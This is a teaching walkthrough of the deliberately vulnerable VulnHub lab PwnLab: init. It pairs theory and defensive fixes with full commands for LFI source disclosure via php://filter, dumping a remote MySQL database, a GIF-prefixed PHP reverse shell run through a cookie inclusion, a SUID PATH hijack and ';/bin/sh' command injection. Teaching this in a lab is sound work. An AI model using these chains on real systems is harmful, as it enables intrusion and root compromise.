# Machine 10 — PwnLab: init

> **Position:** 10 of 13 · **Band 3 — Easy** (global rank **057** of 708)
> **Full writeup:** [`labs/3-057-pwnlab-init/README.md`](../../labs/3-057-pwnlab-init/README.md)

| | |
| --- | --- |
| **Machine** | PwnLab: init |
| **Author** | Claor |
| **Released** | 1 August 2016 |
| **Target OS** | Debian — Apache/PHP, **MySQL exposed on 3306**, `rpcbind` on 111 |
| **VulnHub** | [entry/pwnlab-init,158](https://vulnhub.com/entry/pwnlab-init,158/) |
| **Objective** | root — `/root/flag.txt` |
| **Estimated time** | 5–8 hours |

---

## How to use this card

Same template: **A** (method + theory) · **B** (the machine) · **C** (every command, logically). The new theory here: **LFI done properly**, **`php://filter`** (why it reads **source code**), the **GIF magic header** and `getimagesize()`, the **cookie as user input**, **PATH hijacking**, and **command injection in a SUID helper**.

Every Part C step follows one rhythm — **theory** (why this step exists) → **command** (every flag) → **output** (the lines that matter, decoded) → **beginner trap** → **defensive lesson**. Answer Part B.3 *before* Part C, and climb the hints ladder in Part F only as far as you need.

---

# Part A — The method (theory)

## A.1 LFI vs RFI — and how "reading" becomes "running"

- **LFI** (*Local File Inclusion*): the app includes a file **from the server itself** (e.g. `include($_GET['page'])`). You control a **filesystem path**.
- **RFI** (*Remote File Inclusion*): it includes a file **from another server** (needs `allow_url_include = On`, which HackTricks notes is off by default in PHP).

RFI is more immediately dangerous (it pulls your shell), but LFI is **not less**: it reads **source code**, config, keys — and sometimes leads to RCE.

**Plain language:** inclusion means *"open this file and treat its contents as part of this page."* If the file is PHP, its code **runs with the app's privileges**. So LFI is two different weapons: a **file reader** (for anything not executed — `/etc/passwd`, configs, logs) and, if you can place your own PHP somewhere readable, a **code executor**.

**LFI alone only reads — to execute, the target must *write* a file you control somewhere predictable.** The classic write primitives: an **upload form** (this box), **log poisoning** (inject `<?php … ?>` via a crafted `User-Agent`, then include `/var/log/apache2/access.log`), **PHP session files** (`/var/lib/php/sess_<PHPSESSID>`), and `/proc/self/environ` — all documented on [HackTricks — File Inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion). Every PwnLab writeup we cross-checked used the **upload** primitive; keep log poisoning in your toolkit for boxes with no upload form.

## A.2 Why `php://filter` reads **source code**

When you include a `.php`, PHP **executes** it — you never see its text. **`php://filter`** is a **stream wrapper**: it passes the file's content through a transform **before** showing it. With `convert.base64-encode`:

```
php://filter/convert.base64-encode/resource=config
```

PHP **encodes the file to base64 instead of executing it**, so you **see the source**. Because the wrapper sits **in front**, the `.php` the app appends is harmless (`…resource=config` + `.php` = `config.php` — exactly the file you wanted): *"fetch the file, but run it through an encoder on the way out, so there is no code left to execute."*

> This is the **most useful LFI primitive**: it recovers `config.php`, `wp-config.php`, `.env`, `configuration.php` — i.e. **every database credential** on the box.

## A.3 Why `getimagesize()` accepts a GIF+PHP file

`getimagesize()` checks **only the magic bytes** at the start of the file — the standard signature every image check looks for (`GIF89a` for GIFs, `\x89PNG` for PNGs, `\xFF\xD8\xFF` for JPEGs). Put `GIF89a` **in front of** PHP and `getimagesize()` reports `image/gif`, and the extension passes the allow-list. PHP **ignores** everything outside `<?php … ?>`, so the GIF header is inert and the code after it **runs** — **provided the file is included as PHP**. A file that is both a valid image and valid PHP is called a **polyglot**. The catch: if the browser merely *downloads* your `.gif` (static file, no PHP handler), nothing executes — you still need an inclusion point (A.4).

## A.4 The cookie is **user input**

There is a **second** inclusion point via a cookie: `include("lang/".$_COOKIE['lang'])` — **without** appending `.php`. That is what lets your `.gif` be included and therefore **executed**. **Treat cookies exactly like GET/POST** — they travel in every request and the server reads them just as happily. Two independent inclusion points with different filters is common — **find the loosest one.**

## A.5 PATH hijacking

When a program calls a command **without an absolute path** (e.g. `cat` instead of `/bin/cat`), the shell searches `$PATH` **left to right** and runs the **first match it finds *and can execute***. Put a **directory of your own** at the **front** of `$PATH`, place an executable with the **same name**, and yours runs — with the program's identity (if it is SUID). Two conditions beginners miss: your file must be **executable** (`chmod +x`, or the shell silently skips it and falls back to the real `cat`), and the hijack only matters when the caller runs **as another user** (SUID binary or root cron job).

## A.6 Command injection in a SUID-root helper

`msg2root` builds `/bin/echo <input> >> /root/messages.txt`. Your input passes **unquoted** inside a shell command, so every shell metacharacter stays live: `;` ends the echo and starts **your** command — **as root** (`&&`, `|`, `$(…)` would work the same way). Note: `/bin/echo` has an **absolute path** (good), but the **input is unvalidated** — hardening the command does not substitute for validating the input.

---

# Part B — The machine

## B.1 What you will learn

1. Detect **LFI** and confirm it by reading `/etc/passwd`.
2. Use **`php://filter/convert.base64-encode/resource=`** to disclose PHP source.
3. Read a leaked `config.php` and use its **MySQL root credentials**.
4. Query a **remotely exposed MySQL** server and dump a users table.
5. Recognise **base64-encoded passwords** where hashes should be.
6. Read an upload form's **own source code** via LFI.
7. Bypass an image-only filter with a **GIF magic header**.
8. Trigger execution of the uploaded "image" through the **cookie** inclusion point.
9. Perform a **PATH hijack against a SUID binary**.
10. Perform **command injection in a SUID-root helper**.

## B.2 The map

| Stage | Where |
| --- | --- |
| **LFI** | `index.php?page=…` → `include($_GET['page'].".php")` |
| **Source disclosure** | `?page=php://filter/convert.base64-encode/resource=config` |
| Secrets in config | `config.php` → `root : H4u%QJ_H99`, database `Users` |
| **Exposed database** | MySQL on **3306**, accepts remote root |
| Base64 passwords (not hashes) | `Users.users` → `kent`, `mike`, `kane` |
| **LFI via cookie** | `include("lang/".$_COOKIE['lang'])` — no `.php` |
| **Upload-filter bypass** | `GIF89a` + PHP inside a `.gif` |
| Credential reuse | DB passwords → local accounts |
| **SUID + PATH hijack** | `/home/kane/msgmike` (SUID mike) calls `cat` with no path |
| **SUID + command injection** | `/home/mike/msg2root` (SUID root) → `/bin/echo %s >> /root/messages.txt` |

Read the map as one sentence: **read → leak → log in → upload → execute → reuse → hijack → inject**, each arrow earned by the previous finding.

## B.3 Before you start

- [02 — Web Attacks](../02-Web-Attacks.md) **§5** (LFI and the `php://filter` wrapper) and **§6** (file upload).
- [03 — Service and Network Attacks](../03-Service-and-Network-Attacks.md) **§6** (databases — `localhost` vs `127.0.0.1`).
- [05 — Linux Privilege Escalation](../05-Linux-Privilege-Escalation.md) **§2** (SUID) and **§7** (`PATH` hijacking).

**Answer before:**
1. What is the difference between **LFI** and **RFI**, and which is more dangerous?
2. Why does including a `.php` normally **not** show you its source — and what does `php://filter` change?
3. A file starts with `GIF89a` and then contains PHP. Why would `getimagesize()` accept it, and why would PHP still execute it?
4. `strings` on a SUID binary shows `cat /home/mike/msg.txt`. What is wrong with that line?
5. `/bin/echo %s >> /root/messages.txt` with your input substituted for `%s`. What can you type to get a shell?

---

# Part C — The walkthrough, step by step

## Step 1 — Two-stage scan

**Theory.** You know nothing about the box, so scan in two gears: a **cheap full sweep** to find *which* ports are open, then an **expensive, targeted** scan that spends its time only on those ports — version detection on all 65,535 ports is painfully slow.

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports TARGET
sudo nmap -sC -sV -p 80,111,3306 -oA scans/services TARGET
```

**Flags.** `-p-` every TCP port · `--min-rate 1000` a **floor** on probes/second, so the full sweep finishes in minutes · `-T4` timing template (aggressive but reliable in a lab) · `-oA` save **all three** output formats at once (`.nmap`, `.xml`, `.gnmap` — tooling later wants XML, humans want text) · `-sC` safe default scripts · `-sV` fingerprints service versions (this is what prints `2.4.10`).

```text
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
111/tcp  open  rpcbind 2-4 (RPC #100000)
3306/tcp open  mysql   MySQL (unauthorized)
```

**How to read it.** **Port 80**: the web app — `((Debian))` names the OS family, `2.4.10` is an old Apache (note it; `searchsploit apache 2.4.10` is a habit worth building). **Port 111**: `rpcbind`, the RPC port mapper — mostly noise here, but it is the service behind the extra high-numbered `status` ports some scans report (verification note in Part G). **Port 3306**: MySQL — and **`MySQL (unauthorized)`** means nmap opened the TCP connection but **did not complete the MySQL handshake** (it has no username and password to offer). Read it as *"reachable, but it wants a login"*, **not** *"IP-blocked"*: every writeup we cross-checked then logged in remotely with the leaked credentials (Step 4). The finding stands regardless — **a database listening on the network** is a vulnerability before you know a single password.

**Trap.** One giant `-A -p- -sV` scan waits forever; skipping `-p-` misses services on odd ports. Two scans: sweep, then drill.

**Defensive lesson.** Only the web port should be reachable: `bind-address = 127.0.0.1` in `my.cnf` plus a firewall rule for 3306/111 collapses this attack surface.

## Step 2 — Confirm the LFI

**Theory.** The site navigates with `?page=login`, `?page=upload` — the classic sign that user input is fed to PHP's `include()`. Confirm before you exploit: feed the app a file that **exists** and watch what it does.

```bash
curl -s "http://TARGET/index.php?page=/etc/passwd"
```

`curl` is the command-line HTTP client; `-s` silences the progress meter. The URL is **quoted** because `?` and `&` are special to the shell.

```text
Warning: include(/etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 14
```

**How to read it.** Two facts in one error: `page` **is** passed to `include()` (LFI confirmed), and the app **appends `.php`** — `include($_GET['page'].".php")` — so the path arrived as `/etc/passwd.php`; `on line 14` even points at the sink in the source. Depending on the image build you may instead get **no output at all** (abatchy's writeup reports plain `/etc/passwd` and `../../../../` attempts simply "did not work" — the appended `.php` silently misses). Either way the conclusion is identical: **you cannot read non-`.php` files directly, and `.php` files get executed instead of shown.**

**Trap.** Do not fire twenty `../` variants hoping one sticks — **never "fix" a filter by guessing; make the app show you its code** (Step 3).

**Defensive lesson.** Two bugs hide here: building an include path from user input, and printing PHP warnings to the browser (`display_errors`). Production apps must do neither.

## Step 3 — Bypass the suffix with a stream wrapper

**Theory.** Part A.2: `php://filter/convert.base64-encode/resource=X` runs file `X` through an encoder **instead of executing it**, and the app's appended `.php` completes the filename for you.

```bash
curl -s "http://TARGET/index.php?page=php://filter/convert.base64-encode/resource=config" \
  | grep -oE '[A-Za-z0-9+/=]{40,}' | base64 -d
```

**Pipeline.** `grep -oE '[A-Za-z0-9+/=]{40,}'` — `-o` prints **only the matches** (not whole lines), `-E` enables extended regex, the class is the **base64 alphabet**, `{40,}` keeps only runs of **40+ characters** so short words that merely look like base64 are discarded — without it, decoding the whole HTML page would choke on the markup. `base64 -d` then decodes the extracted blob back to plaintext.

```php
<?php
$server   = "localhost";
$user     = "root";
$pass     = "H4u%QJ_H99";
$database = "Users";
?>
```

**How to read it.** This is `config.php`'s **source**: database host, **root** login, password, database name. The password contains **`%`** — in a URL, `%` starts a percent-escape (you would need `%25`), so use it **literally** in a MySQL client, never inside a query string. Try the same trick on `resource=index` and `resource=upload` whenever you need to understand the app's logic — you now own its source code.

**Trap.** If your decode prints garbage, `grep` extracted the wrong run — adjust the `{40,}` bound instead of abandoning the method.

**Defensive lesson.** Secrets do not belong in files the web user can read: keep `config.php` **outside the document root** and use a **least-privilege** database account instead of `root`.

## Step 4 — Dump the database

**Theory.** You have DB credentials and the DB listens on the network — connect from *your* machine. And remember: base64 is an **encoding**, not a hash — if the app must compare a password back to what it stored, it stored it reversibly, so anyone who can read the table gets the passwords for free.

```bash
mysql -h TARGET -u root -p'H4u%QJ_H99' -D Users -e 'SELECT * FROM users;'
```

**Flags.** `-h TARGET` connects **over TCP** — without `-h` the client uses a local **Unix socket** and may authenticate by your OS user ID (impossible from the attacker machine) · `-u root` the user · `-p'…'` the password **immediately after `-p`, no space** (a space makes mysql treat it as a database name) · `-D Users` select the database · `-e '…'` run one statement and exit.

```text
| User | Password           |
| kent | S0k3an1jZmFuc2tp   |
| mike | U2Ztb2RvbnM=       |
| kane | a2FuZQ==           |
```

**How to read it.** Three users — `kent`, `mike`, `kane` (table `Users.users`, columns `user`/`pass`). The **`=` padding** and the `A–Z a–z 0–9` charset give away **base64, not hashes** (a hash would be 32/40/64 hex chars or start `$2b$`/`$6$`). Decode:

```bash
for h in S0k3an1jZmFuc2tp U2Ztb2RvbnM= a2FuZQ==; do printf '%s' "$h" | base64 -d; echo; done
```

`printf '%s'` writes each value with **no trailing newline** so decoded outputs do not run together; `echo` adds the newline back.

**Note:** the exact strings **vary slightly between image revisions**; the pattern is always **three users with base64 passwords** (most writeups from 2016–2022 show `Sld6WHVCSkpOeQ==`, `U0lmZHNURW42SQ==`, `aVN2NVltMkdSbw==` → `JWzXuBJJNy`, `SIfdsTEn6I`, `iSv5Ym2GRo` — see the ⚠️ Verification note in Part G). **Passwords were stored reversibly** — the app's own `login.php` proves it: it runs `$lpass = base64_encode($_POST['pass'])` and compares *that* to the stored value, i.e. the login check is *"encode what you typed, see if it equals what we stored."*

**Trap.** SQLi is a dead end here — `login.php` uses a **prepared statement** (`WHERE user=? AND pass=?`), which is why joenibe and abatchy both report sqlmap finding nothing injectable. Read the source first and you skip the wasted hour.

**Defensive lesson.** Hash with bcrypt/argon2 + per-user salt — the app should **never** be able to show you a user's password. Base64 is an **encoding**, not storage (Part D repeats this as a fix row).

## Step 5 — Read `upload.php` **before** uploading

**Theory.** You are about to fight an upload filter. You can guess its rules — or read them, because `php://filter` works on any page of this app. **Always read the rules before playing.**

```bash
curl -s "http://TARGET/index.php?page=php://filter/convert.base64-encode/resource=upload" \
  | grep -oE '[A-Za-z0-9+/=]{40,}' | base64 -d
```

```php
$whitelist = array(".jpg",".jpeg",".gif",".png");
$file_ext  = strrchr($filename, '.');
if (!(in_array($file_ext, $whitelist))) { die('Not allowed extension…'); }
if (strpos($filetype,'image') === false) { die('Error 001'); }
if ($imageinfo['mime'] != 'image/gif' …) { die('Error 002'); }
if (substr_count($filetype, '/')>1) { die('Error 003'); }
$uploadfile = 'upload/' . md5(basename($filename)) . $file_ext;
```

**How to read it.** **Four** checks, not three: (1) extension in the **allow-list** — `strrchr` takes everything from the **last** dot, so `shell.php.gif` still ends as `.gif`; (2) the client-declared MIME must contain `image` (`Error 001`); (3) `getimagesize()`'s magic-byte MIME must be `image/gif|jpeg|jpg|png` (`Error 002` — the **hard** check); (4) the MIME type may contain **at most one `/`** (`Error 003` — blocks types like `image/gif/application/x-php`). Then the payoff line: the saved name is **`md5(original_name).ext`** — you cannot choose it, but because it hashes the *name* you can precompute it (`printf '%s' shell.gif | md5sum`); the simplest way is still the `<img src="…">` the page prints right after a successful upload. And note the gate at the top: `if (!isset($_SESSION['user'])) die('You must be log in.')` — the upload form exists only for a **logged-in** session, which is why Step 4's credentials come first.

**Trap.** Uploading a raw `.php` first wastes an attempt — joenibe, flikk and CyberArri all hit `Not allowed extension…` before reading the source. Read, then upload.

**Defensive lesson.** Allow-list + `getimagesize()` still lost because the **content after the header** was never checked: re-encode images server-side, store uploads **outside** the document root, and disable PHP execution there (`php_admin_flag engine off`).

## Step 6 — Build a GIF+PHP polyglot

**Theory.** One file, two readings: `file`/`getimagesize()` see a GIF (first six bytes), PHP sees `<?php … ?>` and executes it — this only works because the checks look at the **start** of the file (Part A.3).

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
sed -i "s/127.0.0.1/ATTACKER/; s/1234/4444/" shell.php
grep -n '^\$ip\|^\$port' shell.php          # VERIFY
printf 'GIF89a;\n' | cat - shell.php > shell.gif
file shell.gif
```

**Commands.** `cp` — Kali ships ready-made reverse shells under `/usr/share/webshells/php/`, start from one · `sed -i "s/A/B/; s/C/D/"` — **edit in place**, substituting your **attacker IP** where `127.0.0.1` was and your **listener port** where `1234` was · `grep -n '^\$ip\|^\$port'` — print the edited lines **with line numbers** to *verify* the edit (**never upload a shell whose IP you only *think* you changed** — flikk lost real time to a typo'd IP) · `printf 'GIF89a;\n' | cat - shell.php > shell.gif` — write the six-byte GIF magic and **prepend** it to the shell (`cat -` means *"read stdin first"*, so the header comes first; the lab writeup's equivalent is `{ echo -n 'GIF89a'; cat shell.php; } > shell.gif`) · `file shell.gif` identifies a file by its **magic bytes**.

```text
shell.gif: GIF image data, version 89a
```

**How to read it.** `file` agreeing it is a GIF means `getimagesize()` will agree too — the polyglot is built. Keep a copy of the payload under its original name locally; you may need to re-edit IP/port later.

**Trap.** `GIF89a` must be the **very first** bytes — anything before it and the magic check fails. And the `.gif` alone does nothing until something *includes* it as PHP (Step 7).

**Defensive lesson.** Content sniffing that only reads a header cannot distinguish *"image that contains code"* from *"code that contains an image"* — re-encoding (decode → re-encode → save) produces a clean image and destroys any trailing payload.

## Step 7 — The second LFI — in a cookie

**Theory.** Upload `shell.gif` through the web form and note the printed path (e.g. `upload/<md5>.gif`). Browsing to it directly just **downloads** it — Apache serves `.gif` statically, no PHP involved. The `page` parameter cannot help either: it appends `.php`, so it can never target a `.gif`. Re-read `index.php` (`resource=index` from Step 3) and you find the answer:

```php
if (isset($_COOKIE['lang'])) { include("lang/".$_COOKIE['lang']); }
```

**No `.php` is appended** — and the `lang/` prefix means your path must climb **out** of it with `../`. That is why the cookie reads `../upload/…`, not `upload/…`.

```bash
nc -lvnp 4444                                                       # Kali, first
curl -s -b "lang=../upload/<MD5>.gif" "http://TARGET/index.php?page=index"
```

**Flags.** `nc -lvnp 4444` — netcat **listener**: `-l` listen, `-v` verbose, `-n` no DNS lookups, `-p` port — **start it before you trigger the payload**. `curl -b "NAME=VALUE"` sends a **cookie**; `?page=index` just makes the page load normally so the cookie check at the top of `index.php` runs.

```text
Ncat: Connection from 192.168.56.101.
www-data@pwnlab:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**How to read it.** The connection line is your listener reporting the **target called back to you** — a *reverse* shell (the target connects out, which firewalls rarely block). `id` shows `www-data`: the unprivileged account Apache runs as. **Find the loosest inclusion point** — the cookie beat the query parameter because it had fewer restrictions. Now upgrade the TTY:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Without this, `su` later complains it *"must be run from a terminal"* (reedphish hit exactly this) — a raw network socket has no terminal attached and `pty.spawn` fakes one. Note it is **`python`, not `python3`**, on this Debian 8-era box.

**Trap.** Cookie without `../` → nothing happens (the include looks for `lang/upload/…`, which does not exist). CyberArri tried `/upload/…` first, failed, then `../upload/…` worked.

**Defensive lesson.** Cookies are user input — validate them like any other parameter. And "not implemented yet" code still **ships** and still runs; remove it rather than leaving a loaded gun in `index.php`.

## Step 8 — www-data → kane: credential reuse

**Theory.** You hold three decoded passwords (Step 4), and people reuse passwords across systems — so try them as **OS logins**. Check `cat /etc/passwd` first to see the real user list; some writeups report an extra `john` account that leads nowhere (a red herring).

```bash
su kane
ls -la /home/kane
```

`su kane` switches user and prompts for **kane's** password (the decoded one); if it refuses with *"must be run from a terminal"*, redo the `pty.spawn` from Step 7.

```text
-rwsr-sr-x 1 mike mike 5148 Mar 17  2016 msgmike
```

**How to read it.** `kent` logs in fine but his home is a dead end; `mike`'s database password **does not work locally** (several writeups confirm) — you will meet `mike` a different way. In kane's home, position by position: `-` regular file · owner `rws` — the **`s` sits where `x` would be** = **SUID** · group `r s r` — `s` where `x` would be = **SGID** · others `r-x` · owner **`mike`**. SUID means: **whoever runs `msgmike`, the kernel runs it as `mike`** — that is your bridge to the next account.

**Trap.** `su` in a raw shell without a TTY fails; and do not stop at the first account that works — **enumerate every home directory**.

**Defensive lesson.** One reused password turned a database leak into an OS login: use unique credentials per system, and audit SUID bits (`find / -perm -u=s -type f`) — most files have no business being SUID.

## Step 9 — kane → mike: SUID + PATH hijack

**Theory.** Before exploiting, understand the binary. Running `./msgmike` as kane prints `cat: /home/mike/msg.txt: No such file or directory` — it is already *calling* `cat`. `strings` pulls every printable string out of a compiled binary (string literals must stay readable for the program to work), which is usually enough to read a small C program's behaviour:

```bash
strings /home/kane/msgmike | grep -iE 'cat|/bin|/usr'
```

`-i` is case-insensitive, `-E` makes `|` work as OR.

```text
cat /home/mike/msg.txt
```

**How to read it.** **`cat` with no `/`** is the vulnerability: the shell resolves a bare name by searching `$PATH` **left to right** and running the **first executable match**. Plant your own `cat` earlier in the search order and *your* program runs — **with mike's privileges**, because the SUID identity applies to everything the binary spawns.

```bash
cd /home/kane
printf '#!/bin/bash\n/bin/bash -i\n' > cat && chmod +x cat
export PATH=/home/kane:$PATH
./msgmike
id
```

**Commands.** `printf … > cat` writes a two-line script named `cat`: line 1 is the **shebang** (which interpreter to use), line 2 starts an **interactive** bash (`-i` keeps a usable prompt); `msgmike` calls it as `cat /home/mike/msg.txt`, the script ignores the argument and just gives you a shell · `chmod +x cat` — without the execute bit the shell **silently skips** your file and falls back to the real `cat`, so you stay `kane` with no error explaining why · `export PATH=/home/kane:$PATH` — **prepend** your directory while keeping the system directories behind it (`$PATH` expands to the old value and is appended) · `./msgmike` runs the SUID binary from the current directory.

```text
uid=1002(mike) gid=1002(mike) groups=1002(mike)
```

**How to read it.** `id` says **mike** — the hijack worked. **Restore `PATH` immediately:** `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`. If you *replaced* PATH instead of prepending (`export PATH=/home/kane`), every normal command disappears — abatchy's writeup shows `bash: ls: command not found` for exactly this reason.

**Trap.** Forgotten `chmod +x` → "nothing happened"; replaced PATH → "nothing works"; no restore → confusion two steps later. All three are self-inflicted and avoidable.

**Defensive lesson.** Absolute paths in every privileged program (`/bin/cat`, never bare `cat`), or better `execve("/bin/cat", …)` with fixed argv and no shell. Ask two questions of **every** SUID binary: *what does it run?* (`strings`) and *does it pass user input to a shell?*

## Step 10 — mike → root: command injection in `msg2root`

**Theory.** One account left, one binary to audit — as `mike`:

```bash
ls -la /home/mike
strings /home/mike/msg2root
```

```text
-rwsr-xr-x 1 root root 5364 Mar 17  2016 msg2root
```
```text
Message for root:
/bin/echo %s >> /root/messages.txt
```

**How to read it.** SUID **root** this time (`owner root`, `s` in the owner slot). The format string says it all: your input lands in `%s` and is pasted **unquoted** into a shell command run as root; `>>` would append the echo output to `/root/messages.txt` — in abatchy's `ls -la /root` you can see `messages.txt -> /dev/null`, a hint the author only ever cared about the *command execution* side.

```bash
/home/mike/msg2root
# at the "Message for root:" prompt type:
;/bin/sh
id
cat /root/flag.txt
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

**How to read it.** The shell runs `/bin/echo ;/bin/sh >> /root/messages.txt`. Parsed left to right: `/bin/echo` with no argument (prints an empty line), `;` **ends that command**, `/bin/sh` starts — **as root**, because the SUID bit gave the whole process root — and the redirection binds only to `/bin/sh`. You get an interactive root shell *and* an empty append. `ls -la /root` shows `flag.txt` with mode `----------` (root-only readable), so nothing but root can open it.

**Alternatives some writeups used:** `opensesame; bash -p` (`-p` preserves privileged IDs — abatchy), or a small compiled `setuid(0)` helper made SUID via injected commands (flikk); others report plain `bash`/`/bin/bash` **not** working at the prompt while `;/bin/sh` does (CyberArri) — if one shell path stalls, try another; `sh` is the safest bet.

> **The pattern to take away:** three different bugs, three accounts, one chain — **reversibly stored credentials** → login; **a bare command name inside a SUID binary** → PATH hijack; **unquoted input inside a SUID binary** → command injection. **Every SUID binary deserves the same two questions: what does it run? (`strings`) and does it pass user input to a shell?**

---

# Part D — Defensive lessons

| Finding | Fix |
| --- | --- |
| `include($_GET['page'].".php")` | **Never build an include path from user input.** Use an allow-list of keys → fixed filenames |
| `include("lang/".$_COOKIE['lang'])` | Same. Cookies are user input — treat them exactly like GET/POST |
| Stream wrappers reachable | `allow_url_include = Off`; disable dangerous wrappers |
| `config.php` with root DB credentials | Least-privilege DB account, never root; keep credentials out of the web root |
| **MySQL exposed on 3306 to the network** | `bind-address = 127.0.0.1`; firewall the port; never grant remote root |
| Passwords base64-encoded, not hashed | Hash with bcrypt/argon2 + per-user salt. Base64 is an **encoding**, not storage |
| Image-only validation via `getimagesize()` | It validates the **header**, not the content. Store uploads outside the document root; re-encode images |
| Uploads inside the web root | Move them; `php_admin_flag engine off` for that directory |
| **SUID `msgmike` calling `cat` without a path** | Absolute paths in every privileged program; better, `execve` with fixed argv and no shell |
| **SUID-root `msg2root` concatenating input into a shell command** | Never pass user input to a shell. Use `write()`/`fputs()` directly |
| Credential reuse DB → local accounts | Unique credentials per system |

**The single biggest lesson:** *the same root cause appears three times* — untrusted input reaching a sink it should never reach (`include`, a shell command, a `PATH` lookup). **Learn to name the sink, and you will find these bugs by inspection rather than by luck.**

---

# Part E — Review questions

1. Why could the GET inclusion **not** execute your `.gif`, while the cookie inclusion could?
2. `php://filter` gave you source code. Name three other files you would try to read with it.
3. The database was reachable on 3306. Independent of the leaked credentials, why is that a finding?
4. Passwords were base64, not hashed. Is that better or worse than plaintext? Explain why "the same".
5. `strings` on `msgmike` was enough to find the vulnerability. Why does `strings` work on a compiled binary?
6. You had to **restore `PATH`** after the hijack. What breaks if you do not?
7. `msg2root` used `/bin/echo` with an absolute path but still fell to injection. What is the difference between *hardening the command* and *sanitising the input*?

---

# Part F — Hints ladder

<details>
<summary><strong>Rung 1 — a nudge</strong></summary>

Ports **80, 111, 3306**. Port 3306 answers from your machine — unusual. The app has a `?page=`. Try `curl "http://TARGET/?page=../../../../etc/passwd"`. If it works, you have LFI. Then think about which files are worth reading — and what you **cannot** read because PHP executes them first.
</details>

<details>
<summary><strong>Rung 2 — reading source</strong></summary>

`?page=php://filter/convert.base64-encode/resource=config` → `root : H4u%QJ_H99`, database `Users`. MySQL 3306 reachable → dump `Users.users` → base64 passwords. Do the same on `resource=upload`.
</details>

<details>
<summary><strong>Rung 3 — the upload</strong></summary>

The form checks image (`getimagesize`/MIME) + extension. Build a file that is **both**: `{ echo -n 'GIF89a'; cat shell.php; } > shell.gif`. Upload it, note the name (md5).
</details>

<details>
<summary><strong>Rung 4 — execute, then escalate</strong></summary>

`page` appends `.php`; the **cookie** does not: `curl -b "lang=../upload/<name>.gif" http://TARGET/index.php` → `www-data`. Then `su kane` → **SUID `msgmike`** (`cat` with no path) → **PATH hijack** → `mike` → **SUID `msg2root`** → `;/bin/sh` → root.
</details>

<details>
<summary><strong>Rung 5 — the answer</strong></summary>

1. `nmap -p-` → **80, 111, 3306**. 2. LFI `?page=`. 3. `php://filter` → `config.php` → `root:H4u%QJ_H99`. 4. MySQL dump → base64 → `kent/mike/kane`. 5. `upload.php` source → image-only. 6. `shell.gif` = `GIF89a`+PHP. 7. Cookie inclusion → `www-data`. 8. `su kane` → SUID `msgmike` → PATH hijack → `mike`. 9. SUID-root `msg2root` → `;/bin/sh` → root → `/root/flag.txt`.
</details>

---

# Part G — References

- **VulnHub entry:** <https://vulnhub.com/entry/pwnlab-init,158/>
- **English lab:** [`labs/3-057-pwnlab-init/README.md`](../../labs/3-057-pwnlab-init/README.md)
- **Greek mirror of this card:** [`Μηχανές/10-pwnlab-init.md`](../../Μαθησιακή%20Διαδρομή%201%20-%20Εισαγωγή%20στην%20Κυβερνοασφάλεια/Μηχανές/10-pwnlab-init.md)
- **Cross-checked writeups** (confirm `php://filter`, GIF polyglot, cookie LFI, PATH hijack):
  - [IRONHACKERS — PwnLab: init](https://ironhackers.es/en/pwnlab-init-writeup-vulnhub/)
  - [joenibe — PwnLab](https://joenibe.github.io/vulnhub/pwnlab/)
  - [reedphish — PwnLab: init](https://reedphish.wordpress.com/2016/09/17/pwnlab-init-walkthrough/)
  - [HackTricks — File Inclusion / php://filter](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

## Community notes — consensus, pitfalls and alternative routes

*(cross-checked against the sources below):*

- **Consensus chain:** LFI at `?page=` → `php://filter/convert.base64-encode/resource=config` → MySQL root `H4u%QJ_H99` on 3306 → dump `Users.users` → base64-decode → login → read `upload.php` via the filter → `GIF89a` polyglot `.gif` → execute via the `lang` cookie → `su kane` → `msgmike` PATH hijack → `mike` → `msg2root` command injection → root. All seven writeups cross-checked follow this chain; **none** needed Apache log poisoning (the `lang` cookie is a cleaner execution primitive than `access.log`).
- **Common pitfall:** the cookie must be `lang=../upload/<md5>.gif` — without `../` nothing executes; the GET `page` inclusion appends `.php`, so the `.gif` only ever fires through the cookie. Visiting the uploaded file directly only *downloads* it (static `.gif`, no PHP handler).
- **Common pitfall:** `su` fails with "must be run from a terminal" until you spawn a TTY (`python -c 'import pty; pty.spawn("/bin/bash")'` — `python`, not `python3`, on this box).
- **Common pitfall:** `export PATH=/home/kane` *replaces* PATH, so `cat`/`ls` disappear — prepend with `:$PATH` instead, and restore the full PATH afterwards; `;/bin/sh` works in `msg2root` where `bash -p` may not.
- **Common pitfall:** forget `chmod +x cat` and the shell silently skips your fake `cat` and falls back to the real one — you stay `kane` with no error message.
- **Alternative route:** the upload check only needs a real image MIME plus the magic header, so a `.png`/`.jpg` name works too (abatchy and CyberArri both uploaded a `GIF89a`-prefixed payload with a `.png` name and included it via the cookie); editing the cookie in Burp's proxy works wherever `curl -b` is awkward (reedphish, flikk, CyberArri).
- **Alternative route:** `msg2root` can be abused beyond `;/bin/sh` — flikk injected commands to `chown root` + `chmod u+s` a tiny compiled `setuid(0)` helper and ran that instead; abatchy used `opensesame; bash -p`.
- **Alternative route:** reversing `msgmike`/`msg2root` with **radare2** or **IDA** instead of `strings` (IRONHACKERS) — same conclusion, more tooling than a beginner needs.
- **Dead ends confirmed by multiple writeups:** SQLi on `login.php` (prepared statements — sqlmap reports nothing injectable); `kent`'s account (nothing interesting); `mike`'s DB password locally (does not work); an extra `john` account in `/home` (red herring); SSH (disabled); linpeas (no useful findings).
- **⚠️ Verification note:** the DB password strings differ between image revisions. This card keeps the values observed on the current lab image (`S0k3an1jZmFuc2tp`, `U2Ztb2RvbnM=`, `a2FuZQ==`); most writeups from 2016–2022 report `kent=Sld6WHVCSkpOeQ==`, `mike=U0lmZHNURW42SQ==`, `kane=aVN2NVltMkdSbw==` (→ `JWzXuBJJNy`, `SIfdsTEn6I`, `iSv5Ym2GRo`). The pattern — three users, base64 passwords — never changes.
